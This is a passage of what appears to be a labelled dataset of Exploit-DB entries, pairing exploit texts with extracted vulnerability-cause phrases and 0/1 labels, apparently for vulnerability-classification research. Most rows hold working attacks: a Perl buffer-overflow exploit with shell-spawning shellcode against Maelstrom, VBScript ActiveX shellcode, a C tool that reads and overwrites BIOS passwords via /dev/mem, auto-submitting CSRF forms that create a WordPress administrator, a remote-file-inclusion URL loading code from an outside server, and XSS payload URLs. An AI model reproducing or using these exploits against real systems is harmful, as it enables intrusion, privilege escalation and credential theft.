*  * --NoSetUidMap:  */   #define _GNU_SOURCE #include <errno.h> #include <fcntl.h> #include <sched.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/wait.h> #include <unistd.h>  extern char **environ;  static int childFunc(void *arg) {   int parentPid=getppid();   fprintf(stderr, ""euid: %d, egid: %d\n"", geteuid(), getegid());   while((geteuid()!=0)&&(parentPid==getppid())) {     sleep(1);   }   fprintf(stderr, ""euid: %d, egid: %d\n"", geteuid(), getegid());    int result=execve(((char**)arg)[0], (char**)arg, environ);   fprintf(stderr, ""Exec failed\n"");   return(1); }   #define STACK_SIZE (1024 * 1024) static char child_stack[STACK_SIZE];  int main(int argc, char *argv[]) {   int argPos;   int noSetGroupsFlag=0;   int setGidMapFlag=1;   int setUidMapFlag=1;   int result;    for(argPos=1; argPos<argc; argPos++) {     char *argName=argv[argPos];     if(!strcmp(argName, ""--"")) {       argPos++;       break;     }     if(strncmp(argName, ""--"", 2)) {       break;     }     if(!strcmp(argName, ""--NoSetGidMap"")) {       setGidMapFlag=0;       continue;     }     if(!strcmp(argName, ""--NoSetGroups"")) {       noSetGroupsFlag=1;       continue;     }     if(!strcmp(argName, ""--NoSetUidMap"")) {       setUidMapFlag=0;       continue;     }      fprintf(stderr, ""%s: unknown argument %s\n"", argv[0], argName);     exit(1);   }   // Create child; child commences execution in childFunc() // CLONE_NEWNS: new mount namespace // CLONE_NEWPID // CLONE_NEWUTS   pid_t pid=clone(childFunc, child_stack+STACK_SIZE,       CLONE_NEWUSER|CLONE_NEWIPC|CLONE_NEWNET|CLONE_NEWNS|SIGCHLD, argv+argPos);   if(pid==-1) {     fprintf(stderr, ""Clone failed: %d (%s)\n"", errno, strerror(errno));     return(1);   }    char idMapFileName[128];   char idMapData[128];    if(!noSetGroupsFlag) {     sprintf(idMapFileName, ""/proc/%d/setgroups"", pid);     int setGroupsFd=open(idMapFileName, O_WRONLY);     if(setGroupsFd<0) {       fprintf(stderr, ""Failed to open setgroups\n"");       return(1);     }     result=write(setGroupsFd, ""deny"", 4);     if(result<0) {       fprintf(stderr, ""Failed to disable setgroups\n"");       return(1);     }     close(setGroupsFd);   }    if(setUidMapFlag) {     sprintf(idMapFileName, ""/proc/%d/uid_map"", pid);     fprintf(stderr, ""Setting uid map in %s\n"", idMapFileName);     int uidMapFd=open(idMapFileName, O_WRONLY);     if(uidMapFd<0) {       fprintf(stderr, ""Failed to open uid map\n"");       return(1);     }     sprintf(idMapData, ""0 %d 1\n"", getuid());     result=write(uidMapFd, idMapData, strlen(idMapData));     if(result<0) {       fprintf(stderr, ""UID map write failed: %d (%s)\n"", errno, strerror(errno));       return(1);     }     close(uidMapFd);   }    if(setGidMapFlag) {     sprintf(idMapFileName, ""/proc/%d/gid_map"", pid);     fprintf(stderr, ""Setting gid map in %s\n"", idMapFileName);     int gidMapFd=open(idMapFileName, O_WRONLY);     if(gidMapFd<0) {       fprintf(stderr, ""Failed to open gid map\n"");       return(1);     }     sprintf(idMapData, ""0 %d 1\n"", getgid());     result=write(gidMapFd, idMapData, strlen(idMapData));     if(result<0) {       if(noSetGroupsFlag) {         fprintf(stderr, ""Expected failed GID map write due to enabled group set flag: %d (%s)\n"", errno, strerror(errno));       } else {         fprintf(stderr, ""GID map write failed: %d (%s)\n"", errno, strerror(errno));         return(1);       }     }     close(gidMapFd);   }    if(waitpid(pid, NULL, 0)==-1) {     fprintf(stderr, ""Wait failed\n"");     return(1);   }   return(0); } --- EOF ---",nosuid mount options,0
22616,"Maelstrom Player 3.0.x - Argument Buffer Overflow (1) source: https://www.securityfocus.com/bid/7632/info  Maelstrom for Linux has been reported prone to a buffer overflow vulnerability.  The issue is reportedly due to a lack of sufficient bounds checking performed on user-supplied data before it is copied into an internal memory space. It may be possible for a local attacker to exploit this condition and have malicious arbitrary code executed in the context of the Maelstrom application. Typically setGID games.  It should be noted that although this vulnerability has been reported to affect Maelstrom version 3.0.6 and 3.0.5 previous versions might also be affected.   #!/usr/bin/perl -w # # /usr/bin/Maelstrom -player Local Buffer Overflow Exploit by akcess # # This code exploits the -player overflow which i discovered after # reading the initial advisory detailing  the -server  overflow by # Luca Ercoli # # [ akcess@linuxmail.org ] - *21/05/03*   $sc = ""\x90""x1500; # write stdout ""akcess wuz here...""; execve /bin/sh; exit; $sc .= ""\x31\xc0\x31\xdb\x31\xd2\x53\x68\x2e\x2e\x20\x0a\x68\x65\x72\x65""; $sc .= ""\x2e\x68\x75\x7a\x20\x68\x68\x73\x73\x20\x77\x68\x61\x6b\x63\x65""; $sc .= ""\x89\xe1\xb2\x18\xb0\x04\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68""; $sc .= ""\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24""; $sc .= ""\xb0\x0b\xcd\x80"";  $ENV{'SC'} = $sc;  $offset = ""0""; $ret = 0xbffff9ee;   for ($i = 0; $i < (8177 - 4); $i++) {     $buf .= ""\x90""; }   $buf .= pack('l', ($ret + $offset));  print(""Using return address: 0x"", sprintf('%lx',($ret + $offset)),""\n""); exec(""/usr/bin/Maelstrom -player 1\@'$buf'"");",a lack of sufficient bounds checking performed on user-supplied data before it is copied into an internal memory space,1
29302,Mono XSP 1.x/2.0 - Source Code Information Disclosure source: https://www.securityfocus.com/bid/21687/info  XSP is prone to a source code information-disclosure vulnerability because it fails to properly sanitize user-supplied input.   An attacker can exploit this vulnerability to retrieve arbitrary files from the vulnerable system in the context of the webserver process. Information obtained may aid in further attacks.  http://www.example.com/app/Default.aspx%20,fails to properly sanitize user-supplied input,1
22243,"RARLAB FAR 1.65/1.70 - File Manager Buffer Overflow source: https://www.securityfocus.com/bid/6822/info  A buffer overflow vulnerability has been reported for FAR that may result in a denial of service condition. The vulnerability exists due to insufficient bounds checking performed by FAR when parsing directory paths. Specifically, when FAR attempts to parse overly long paths it will crash thereby resulting in a denial of service condition.   SET A=A<260 chars>A SET B=BBBBBBBBBBBBBBBB mkdir \\?\c:\%A% mkdir \\?\c:\%A%\%A% mkdir \\?\c:\%A%\%B%\",insufficient bounds checking performed by FAR when parsing directory paths,1
28826,"Cerberus Helpdesk 3.2.1 - 'Rpc.php' Unauthorized Access source: https://www.securityfocus.com/bid/20598/info  Cerberus Helpdesk is prone to an unauthorized-access vulnerability because the application fails to authenticate users properly, resulting in an improper-access validation. A workaround is available.  An attacker can exploit this vulnerability to retrieve other users' arbitrary ticket data. Information obtained can lead to a compromise of other users' confidential information.  Version 3.2.1 is affected by this issue; other versions may be vulnerable as well.  http://www.example.com/rpc.php?cmd=display_get_requesters&id=[ticket#]",the application fails to authenticate users properly,1
22578,"ttCMS 2.2 / ttForum 1.1 - 'install.php?installdir' Remote File Inclusion source: https://www.securityfocus.com/bid/7542/info   A remote file include vulnerability has been reported for both ttForum and ttCMS. Due to insufficient sanitization of some user-supplied variables by the 'News.php' and 'Install.php' scripts, it is possible for a remote attacker to include a malicious PHP file in a URL.   Successful exploitation will result in the execution of the attacker-supplied PHP instructions with the privileges of the web server.   There are conflicting reports about whether or not this issue exists. The vendor has stated that exploitation of this issue is not possible.  http://www.example.com/install.php?step=7&installdir=http://yourserver/Settings.php",insufficient sanitization of some user-supplied variables by the 'News.php ' and 'Install.php' scripts,1
35604,"eForum 1.1 - 'eforum.php' Arbitrary File Upload source: https://www.securityfocus.com/bid/47309/info  eForum is prone to an arbitrary-file-upload vulnerability because the application fails to adequately sanitize user-supplied input.  An attacker can exploit this issue to upload arbitrary code and run it in the context of the webserver process.  eForum 1.1 is vulnerable; other versions may also be affected.   if (isset($_FILES)) { //upload attachments   ...snip...    $invalidFileTypes = array('php', 'php3', 'php4', 'php5', 'exe', 'dll', 'so', 'htaccess');    $uploaddir = $eforum->path.'/upload';    $upfiles = $_FILES['efattachment'];      foreach ($upfiles['name'] as $idx => $upname) {        if ($upname != '') {          $source = $upfiles['tmp_name'][$idx];            if (is_uploaded_file($source)) {              if (in_array($fmanager->FileExt($upname), $invalidFileTypes)) { continue; }",the application fails to adequately sanitize user-supplied input,1
32432,ClickBank Portal - 'search.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/31438/info  Clickbank Portal is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   The following example is available:  http://www.example.com/search.php in search box code Xss,fails to sufficiently sanitize user-supplied data,1
26753,"Multiple Vendor BIOS - Keyboard Buffer Password Persistence (2) // source: https://www.securityfocus.com/bid/15751/info   Multiple vendors fail to clear the BIOS (Basic Input-Output System) keyboard buffer after reading the preboot authentication password during the system startup process.   Depending on the operating system running on affected computers, the memory region may or may not be available for user-level access. With Linux operating systems, superuser access is required. With Microsoft Windows operating systems, nonprivileged users may access the keyboard buffer region.   Attackers who obtain the password used for preboot authentication may then use it for further attacks.   UPDATE: Reportedly, the BIOS API calls and the BIOS keyboard buffer are used by various preboot authentication applications to read a password from the keyboard in an insecure manner. These applications are also vulnerable to this issue.   This issue is reported to affect the following software:   - Truecrypt 5.0 for Windows - DiskCryptor 0.2.6 for Windows and prior - Secu Star DriveCrypt Plus Pack v3.9 and prior - Grub Legacy (GNU GRUB 0.97) and prior - Lilo 22.6.1 and prior versions - Award BIOS Modular 4.50pg - Insyde BIOS V190 - Intel Corp BIOS PE94510M.86A.0050.2007.0710.1559 (07/10/2007) - Hewlett-Packard BIOS 68DTT Ver. F.0D (11/22/2005) - IBM Lenovo BIOS 7CETB5WW v2.05 (10/13/2006)   #define BIOS_PWD_ADDR 0x041e  #include <stdio.h> #include <stdlib.h> #include <unistd.h>  #include <sys/types.h> #include <sys/uio.h>  struct dumpbuff { char tab[32]; };  int dump_bios_pwd(void) { char tab[32]; char tab2[16]; int fd,a,i,j;  fd = open(""/dev/mem"", ""r"");  if(fd == -1) { printf(""cannot open /dev/mem""); return 1; }  a=lseek(fd,BIOS_PWD_ADDR,SEEK_SET); a=read(fd, &tab, 32); if(a<=0) { printf(""cannot read /dev/mem""); return 1; }  close(fd);  i=0; for (j=0;j<16;j++) { tab2[i]=tab[2*j]; i++; }  printf(""\n\nPassword : ""); for (j=0;j<16;j++) { printf(""%c"",tab2[j]);  }  printf(""\n""); return 0;  }  int clear_bios_pwd (void) {  FILE *f; struct dumpbuff b; int i; long j=1054;  for (i=0;i<32;i++) { b.tab[i]=' '; }  f=fopen(""/dev/mem"",""r+""); fseek(f,j,SEEK_SET);  fwrite (&b, sizeof(struct dumpbuff),1,f); fclose(f); printf(""\n[Buffer Cleared]\n""); return 0; }  int change_pwd() {  FILE *f; struct dumpbuff b; int i; long j=1054; char pwd[18]; char crap;  //Ask Pwd...  printf(""\n Enter new Pwd :\n(16 caratcters max)\n"");  for (i=0;i<18;i++) { pwd[i]=' '; }  scanf(""%s%c"",&pwd,&crap);  for (i=0;i<=15;i++) { b.tab[2*i]=pwd[i]; b.tab[2*i+1]=' '; }  f=fopen(""/dev/mem"",""r+""); fseek(f,j,SEEK_SET);  fwrite (&b, sizeof(struct dumpbuff),1,f); printf(""\n[Buffer Uptdated]\n""); fclose(f);  return 0;  }  int main(void) {  char choiceval=0; char crap; char tab3[100];  printf("" _=�Bios Bumper�=_ \n\n\n""); printf("" (endrazine (at) pulltheplug (dot) org [email concealed]) \n""); printf("" by Endrazine\n"");  while(choiceval !='x') { printf (""\n==============================\n""); printf(""[Keyboard buffer manipulation]\n""); printf(""==============================\n""); printf(""\n 1 - Display Password\n""); printf("" 2 - Clear Keyboard Buffer\n""); printf("" 3 - Enter new Password\n""); printf(""\n==============================\n""); printf(""\n x - Quit\n"");  scanf(""%c%c"",&choiceval,&crap);  if (choiceval=='1') dump_bios_pwd();  if (choiceval=='2') clear_bios_pwd();  if (choiceval=='3') change_pwd();  } return 0; }",fail to clear the BIOS (Basic Input-Output System) keyboard buffer after reading the preboot authentication password during the system startup process,1
30901,"Apache 2.2.6 (Windows) - Share PHP File Extension Mapping Information Disclosure source: https://www.securityfocus.com/bid/26939/info  Apache is prone to an information-disclosure vulnerability.  This issue occurs because Apache fails to properly associate file extensions with the correct engines when handling specially crafted requests for files on Windows SMB shares.  Attackers can leverage this issue to view arbitrary script files as plain text. Potentially sensitive information may be present in the script code. Information harvested could aid in further attacks.  This issue affects Apache 2.2.6 when serving PHP files from a Windows SMB share; other versions may also be affected.  NOTE: This issue may also occur when handling other filename extensions that use AddType directives to associate scripts or executables (e.g. '.cgi\', '.py\', '.rb\', etc.).  http://www.example.com/winshare/info.php\",Apache fails to properly associate file extensions with the correct engines,1
46162,"Microsoft Windows 10 - COM Desktop Broker Privilege Escalation Windows: COM Desktop Broker Elevation of Privilege Platform: Windows 10 1809 (almost certainly earlier versions as well). Class: Elevation of Privilege Security Boundary (per Windows Security Service Criteria): AppContainer Sandbox  Summary:   The COM Desktop Broker doesn’t correctly check permissions resulting in elevation of privilege and sandbox escape.  Description: Windows 10 introduced “Brokered Windows Runtime Components for side-loaded applications” which allows a UWP application to interact with privileged components by allowing developers to write a custom broker in .NET. Rather than handling this with the existing Runtime Broker a new “Desktop Broker” was created and plumbed into the COM infrastructure. This required changes in COMBASE to instantiate the broker class and RPCSS to control access to the broker.  The stated purpose is only for use by sideloaded enterprise applications, specifically .NET based ones. Looking at the checks in RPCSS for the activation of the broker we can see the check as follows:  HRESULT IsSideLoadedPackage(LPCWSTR *package_name, bool *is_sideloaded) {   PackageOrigin origin;   *is_sideloaded = false;   HRESULT hr = GetStagedPackageOrigin(package_name, &origin);   if (FAILED(hr))     return hr;      *is_sideloaded = origin != PackageOrigin_Store;   return S_OK; }  This check is interesting because it considered anything to be sideloaded that hasn’t come from the Store. Looking at the PackageOrigin enumeration this includes Inbox applications such as Cortana and Edge both of which process potentially untrusted content from the network. Of course this isn’t an issue if the broker is secure, but…  For a start, as long as RPCSS thinks the current package is side-loaded this feature doesn’t require any further capability to use, or at least nothing checks for one during the process. Even in the side loading case this isn’t ideal, it means that even though a side loaded application is in the sandbox this would allow the application to escape without giving the installer of the application any notice that it has effectively full trust. Contrast this with Desktop Bridge UWP applications which require the “fullTrust” capability to invoke a Win32 application outside the sandbox. This is even more important for a sandbox escape from an Inbox application as you can’t change the capabilities at all without having privileged access. Now, technically you’re supposed to have the appropriate configuration inside the application’s manifest to use this, but that only applies if you’re activating through standard COM Runtime activation routes, instead you can just create an instance of the broker’s class (which is stored in the registry, but at least seems to always be C8FFC414-946D-4E61-A302-9B9713F84448). This class is running in a DLL surrogate at normal user privileges. Therefore any issue with this interface is a sandbox escape. The call implements a single interface, IWinRTDesktopBroker, which looks like:  class IWinRTDesktopBroker : public IUnknown {     HRESULT GetClassActivatorForApplication(HSTRING dir, IWinRTClassActivator** ppv); };  This interface has only one method, GetClassActivatorForApplication which takes the path to the brokered components directory. No verification of this directory takes place, it can be anywhere you specify. I’d have assumed it might have at least been limited to a special subdirectory of the package installation, but I’d clearly be wrong. Passing an arbitrary directory to this method, you get back the following interface:  class IWinRTClassActivator : public IUnknown {     HRESULT ActivateInstance(HSTRING activatableClassId, IInspectable** ppv);     HRESULT GetActivationFactory(HSTRING activatableClassId, REFIID riid, IUnknown** ppv); };  So to escape the sandbox with this you can create directory somewhere, copy in a WinRT component winmd file then activate it. The activation process will run class constructors and give you arbitrary code execution outside the sandbox.   However, even if the directory was checked in some way as long as you can get back the IWinRTClassActivator interface you could still escape the sandbox as the object is actually an instance of the System.Runtime.InteropServices.WindowsRuntime.WinRTClassActivator class which is implemented by the .NET BCL. This means that it exposes a managed DCOM object to a low-privileged caller which is pretty simple to exploit using my old serialization attacks (e.g. MSRC case 37122). The funny thing is MSRC wrote a blog post [1] about not using Managed DCOM across security boundaries almost certainly before this code was implemented but clearly it wasn’t understood. [1] https://blogs.technet.microsoft.com/srd/2014/10/14/more-details-about-cve-2014-4073-elevation-of-privilege-vulnerability/  There are some caveats, as far as I can tell you can’t create this broker from an LPAC Edge content process, more because the connection to the broker fails rather than any activation permissions check. Therefore to exploit from Edge you’d need to get into the MicrosoftEdge process (or another process outside of LPAC). This is left as an exercise for the reader.  Fixing wise, I’d guess unless you’re actually using this for Inbox applications at a minimum you probably should only Developer and LOB origins. Ideally you’d probably want to require a capability for its use but the horse may have bolted on that one. Anyway you might not consider this an issue as it can’t easily be used from LPAC and side-loading is an issue unto itself.  Proof of Concept:  I’ve provided a PoC as a solution containing the C# PoC and Brokered Component as well as a DLL which can be injected into Edge to demonstrate the issue. The PoC will inject the DLL into a running MicrosoftEdge process and run the attack. Note that the PoC needs to know the relative location of the ntdll!LdrpKnownDllDirectoryHandle symbol for x64 in order to work. It should be set up for the initial release of RS5 (17763.1) but if you need to run it on another machine you’ll need to modify GetHandleAddress in the PoC to check the version string from NTDLL and return the appropriate location (you can get the offset in WinDBG using ‘? ntdll!LdrpKnownDllDirectoryHandle-ntdll). Also before you ask, the injection isn’t a CIG bypass you need to be able to create an image section from an arbitrary file to perform the injection which you can do inside a process running with CIG.  1) Compile the solution in “Release” mode for “Any CPU”. It’ll need to pull NtApiDotNet from NuGet to build. 2) Start a copy of Edge. 3) Execute the PoC from the x64\Release directory.  Expected Result: Creating the broker fails.  Observed Result: The broker creation succeeds and notepad executes outside the sandbox.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46162.zip",the connection to the broker fails rather than any activation permissions check,1
29480,Indexu 5.0/5.3 - 'tell_friend.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/22084/info     Indexu is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.     An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.     Indexu 5.3.0 and prior versions are vulnerable; other versions may also be affected.   http://www.example.com/INDEXU_PATH/tell_friend.php?friend_name=[XSS] http://www.example.com/INDEXU_PATH/tell_friend.php?friend_email=[XSS] http://www.example.com/INDEXU_PATH/tell_friend.php?error_msg=[XSS] http://www.example.com/INDEXU_PATH/tell_friend.php?my_name=[XSS] http://www.example.com/INDEXU_PATH/tell_friend.php?my_email=[XSS] http://www.example.com/INDEXU_PATH/tell_friend.php?id=[XSS],fails to properly sanitize user-supplied input,1
30069,"Dart ZipLite Compression 1.8.5.3 - 'DartZipLite.dll' ActiveX Control Buffer Overflow source: https://www.securityfocus.com/bid/24099/info  The Dart ZipLite Compression ActiveX control is prone to a buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.  Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.  Dart ZipLite Compression ActiveX control 1.8.5.3 is vulnerable to this issue; other versions may also be affected.   <pre> <span style=""font: 14pt Courier New;""><p align=""center""><b>2007/05/22</b></p></span> <code><span style=""font: 10pt Courier New;""><span class=""general1-symbol"">------------------------------------------------------------------------------------------------- <b>Dart ZipLite Compression for ActiveX (DartZipLite.dll v. 1.8.5.3) Local Buffer Overflow Exploit</b> url: http://www.dart.com/ author: shinnai mail: shinnai[at]autistici[dot]org site: http://shinnai.altervista.org Special thanks to <b><font color=red>rgod</font></b> that found the bug in DartZip.dll for his exploit see <a href=""http://retrogod.altervista.org/ie_DartZip_bof.html"">http://retrogod.altervista.org/ie_DartZip_bof.html</a> ------------------------------------------------------------------------------------------------- <object classid='clsid:42BA826E-F8D8-4D8D-8C05-14ABCE00D4DD' id='test'></object> <input language=VBScript onclick=tryMe() type=button value=""Click here to start the test""> <script language = 'vbscript'> Sub tryMe() buff = String(1024, ""A"") get_EIP = unescape(""%EB%AA%3F%7E"") buff1 = String(28, ""A"") nop = String(16, unescape(""%90"")) shellcode = unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49"") & _ unescape(""%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") & _ unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34"") & _ unescape(""%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") & _ unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%54"") & _ unescape(""%42%30%42%50%42%50%4b%58%45%54%4e%53%4b%58%4e%37"") & _ unescape(""%45%50%4a%47%41%30%4f%4e%4b%38%4f%44%4a%51%4b%48"") & _ unescape(""%4f%55%42%42%41%30%4b%4e%49%44%4b%48%46%43%4b%38"") & _ unescape(""%41%30%50%4e%41%53%42%4c%49%49%4e%4a%46%58%42%4c"") & _ unescape(""%46%57%47%50%41%4c%4c%4c%4d%50%41%30%44%4c%4b%4e"") & _ unescape(""%46%4f%4b%53%46%35%46%32%46%30%45%37%45%4e%4b%48"") & _ unescape(""%4f%35%46%32%41%50%4b%4e%48%56%4b%38%4e%50%4b%54"") & _ unescape(""%4b%48%4f%55%4e%31%41%30%4b%4e%4b%38%4e%41%4b%38"") & _ unescape(""%41%30%4b%4e%49%58%4e%35%46%42%46%50%43%4c%41%43"") & _ unescape(""%42%4c%46%36%4b%48%42%34%42%33%45%38%42%4c%4a%37"") & _ unescape(""%4e%30%4b%48%42%34%4e%50%4b%48%42%57%4e%31%4d%4a"") & _ unescape(""%4b%38%4a%46%4a%50%4b%4e%49%50%4b%48%42%38%42%4b"") & _ unescape(""%42%30%42%50%42%30%4b%48%4a%36%4e%53%4f%35%41%33"") & _ unescape(""%48%4f%42%46%48%35%49%58%4a%4f%43%48%42%4c%4b%57"") & _ unescape(""%42%55%4a%46%42%4f%4c%48%46%50%4f%35%4a%46%4a%49"") & _ unescape(""%50%4f%4c%38%50%30%47%55%4f%4f%47%4e%43%56%41%36"") & _ unescape(""%4e%46%43%46%50%52%45%36%4a%37%45%36%42%30%5a"") egg = buff + get_EIP + buff1 + nop + shellcode + nop test.QuickZip egg, ""default"", True, True, ""default"", 1 End Sub </script> </span></span> </code></pre>",the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer,1
18791,"WordPress Core 3.3.1 - Multiple Cross-Site Request Forgery Vulnerabilities +---------------------------------------------------------------------------------------------------------------------------------------------------+ # Exploit Title     : Wordpress 3.3.1 Multiple CSRF Vulnerabilities  # Date              : 19-03-2012 # Author            : Ivano Binetti (http://www.ivanobinetti.com) # Software link     : http://wordpress.org/wordpress-3.3.1.zip # Vendor site       : http://wordpress.org # Version           : 3.3.1 (and lower). Probably also version 3.3.2 is affected. # Tested on         : Debian Squeeze (6.0)  # Original Advisory : http://www.webapp-security.com/2012/04/wordpress-3-3-1-multiple-csrf-vulnerabilities/ # CVE               : CVE-2012-1936 # OSVDB ID          : 81588 # Bugtraq ID        : 53280 +---------------------------------------------------------------------------------------------------------------------------------------------------+ Summary 1)Introduction 2)Vulnerabilities Description   2.1 Multiple CSRF 3)Exploit  3.1 CSRF (Change Post Title)  3.2 CSRF (Add Admin) +---------------------------------------------------------------------------------------------------------------------------------------------------+ 1)Introduction WordPress ""is web software you can use to create a beautiful website or blog. We like to say that WordPress is both free and priceless at  the same time.""  2)Vulnerability Description   2.1 Multiple CSRF  Wordpress 3.3.1 suffers from multiple CSRF vulnerabilities which allow an attacker to change post title, add  administrators/users, delete administrators/users, approve and unapprove comment, delete comment, change background image, insert custom   header image, change site title, change administrator's email, change Wordpress Address, change Site Address, when an authenticated user/admin   browses a special crafted web page. May be other parameters can be modified.   This vulnerability is caused by a security flaw in anti-CSRF token (_wpnonce, _wpnonce_create-user, _ajax_nonce,   _wpnonce-custom-background-upload, _wpnonce-custom-header-upload) generation. For some operations (see below) above specified anti-CSRF tokens are  not associated with the current user session (as Owasp recommends) but are the are valid for all operations (for a specific administrator/user)  within 12 hour.  The above described vulnerability allows an attacker - who has sniffed anti-CSRF token - to have 12 hour to perform a CSRF attack.  For Owasp recommendation about anti-CSRF token, you can read the following document:  https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#General_Recommendation:_Synchronizer_Token_Pattern   This problem affects the following operations:  - Add Admin/User  - Delete Admin/User  - Approve comment  - Unapprove comment  - Delete comment  - Change background image  - Insert custom header image  - Change site title  - Change administrator's email  - Change Wordpress Address  - Change Site Address  Other operations (like insert a new post) are not affected by this CSRF vulnerability.  In this Advisory I will only demonstrate how to change post title and how to add a new administrator account.   3)Exploit    3.1 CSRF (Change Post Title)  <html>  <body onload=""javascript:document.forms[0].submit()"">  <H2>CSRF Exploit to change post title</H2>  <form method=""POST"" name=""form0"" action=""http://<wordpress_ip>:80/wp-admin/admin-ajax.php"">  <input type=""hidden"" name=""post_title"" value=""hackedtitle""/>  <input type=""hidden"" name=""post_name"" value=""hackedtitle""/>  <input type=""hidden"" name=""mm"" value=""03""/>  <input type=""hidden"" name=""jj"" value=""16""/>  <input type=""hidden"" name=""aa"" value=""2012""/>  <input type=""hidden"" name=""hh"" value=""""/>  <input type=""hidden"" name=""mn"" value=""""/>  <input type=""hidden"" name=""ss"" value=""""/>  <input type=""hidden"" name=""post_author"" value=""1""/>  <input type=""hidden"" name=""post_password"" value=""""/>  <input type=""hidden"" name=""post_category%5B%5D"" value=""0""/>  <input type=""hidden"" name=""post_category%5B%5D"" value=""1""/>  <input type=""hidden"" name=""tax_input%5Bpost_tag%5D"" value=""""/>  <input type=""hidden"" name=""comment_status"" value=""open""/>  <input type=""hidden"" name=""ping_status"" value=""open""/>  <input type=""hidden"" name=""_status"" value=""publish""/>  <input type=""hidden"" name=""post_format"" value=""0""/>  <input type=""hidden"" name=""_inline_edit"" value=""<sniffed_value>""/>  <input type=""hidden"" name=""post_view"" value=""list""/>  <input type=""hidden"" name=""screen"" value=""edit-post""/>  <input type=""hidden"" name=""action"" value=""inline-save""/>  <input type=""hidden"" name=""post_type"" value=""post""/>  <input type=""hidden"" name=""post_ID"" value=""1""/>  <input type=""hidden"" name=""edit_date"" value=""true""/>  <input type=""hidden"" name=""post_status"" value=""all""/>  </form>  </body>  </html>   Note: this exploit simulate changing of post title using ""Quick Edit"" function   3.2 CSRF (Add Admin)  <html>  <body onload=""javascript:document.forms[0].submit()"">  <H2>CSRF Exploit to add Administrator</H2>  <form method=""POST"" name=""form0"" action=""http://<wordpress_ip>:80/wp-admin/user-new.php"">  <input type=""hidden"" name=""action"" value=""createuser""/>  <input type=""hidden"" name=""_wpnonce_create-user"" value=""<sniffed_value>""/>  <input type=""hidden"" name=""_wp_http_referer"" value=""%2Fwordpress%2Fwp-admin%2Fuser-new.php""/>  <input type=""hidden"" name=""user_login"" value=""admin2""/>  <input type=""hidden"" name=""email"" value=""admin2@admin.com""/>  <input type=""hidden"" name=""first_name"" value=""admin2@admin.com""/>  <input type=""hidden"" name=""last_name"" value=""""/>  <input type=""hidden"" name=""url"" value=""""/>  <input type=""hidden"" name=""pass1"" value=""password""/>  <input type=""hidden"" name=""pass2"" value=""password""/>  <input type=""hidden"" name=""role"" value=""administrator""/>  <input type=""hidden"" name=""createuser"" value=""Add+New+User+""/>  </form>  </body>  </html> +--------------------------------------------------------------------------------------------------------------------------------------------------+",a security flaw,0
31850,"Campus Bulletin Board 3.4 - '/post3/book.asp?review' Cross-Site Scripting source: https://www.securityfocus.com/bid/29375/info  Campus Bulletin Board is prone to multiple input-validation vulnerabilities, including multiple SQL-injection issues and a cross-site scripting issue, because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Campus Bulletin Board 3.4 is vulnerable; other versions may also be affected.   http://www.example.com/post3/Book.asp?review=<script>alert(/xss/)</script>",fails to sufficiently sanitize user-supplied data,1
28357,"Microsoft Windows XP/2000/2003 - Explorer Drag and Drop Remote Code Execution source: https://www.securityfocus.com/bid/19389/info  Microsoft Windows is prone to a remote code-execution vulnerability. This issue affects the Windows Explorer component. This issue is caused by insecure handling of Drag and Drop events.  There is a public proof-of-concept that demonstrates that this vulnerability may be exploited to execute a malicious HTML application (HTA) without prompting the user for permission.  REPORT NAME: PLEBO-2006.06.16-IE_ONE_MINOR_ONE_MAJOR DESTINATION: To Publish EMAIL RECPT: bugtraq  CONTENTS ~~~~~~~~ 0. IMPORTANT NOTICE 1. SUMMARY 2. READ CONTENT OF ANY DOMAIN - PROOF OF CONCEPT 3. READ CONTENT OF ANY DOMAIN - TIPS FOR MATURE EXPLOIT 4. DOUBLE-CLICK ANYWHERE ON WEB PAGE COULD ALLOW REMOTE CODE EXECUTION - PROOF OF CONCEPT 5. DOUBLE-CLICK ANYWHERE ON WEB PAGE COULD ALLOW REMOTE CODE EXECUTION - TIPS FOR MATURE EXPLOIT  0. IMPORTANT NOTICE ~~~~~~~~~~~~~~~~~~~ Copyright (c) 2006 Plebo Aesdi Nael Permission is hereby granted for the redistribution of this document electronically. It is not to be edited in any way without express consent of Plebo Aesdi Nael. Please email plebo@gmx.net for permission if you wish to reprint the whole or any part of this document in any other medium excluding electronic medium.  Plebo Aesdi Nael, plebo@gmx.net  -----BEGIN PGP PUBLIC KEY BLOCK----- Version: GnuPG v1.4.0 (FreeBSD)  mQGiBELFR34RBAD0ZhPk2W6NkHbZObLX4b20fQA5A1HcxVX7nktxXn1CNPNZGwln 52Je7+nCvMC0kLlFPc2Mu52aL5G+WMNbPYnkXCsNxFAiscRYaIcMbw4PvB9CW21z ZDX7Aq+RgCrgQXOF6FumXUgSGgokVEL0wGB6FWgDlE/t3apmaiNA+Et5YwCgqcf7 y1TTOijW91Y1GkghHYQon7ED/3SXsO8esEOax5cXEnKkGfyuWVVzxcOKSddFh6xB 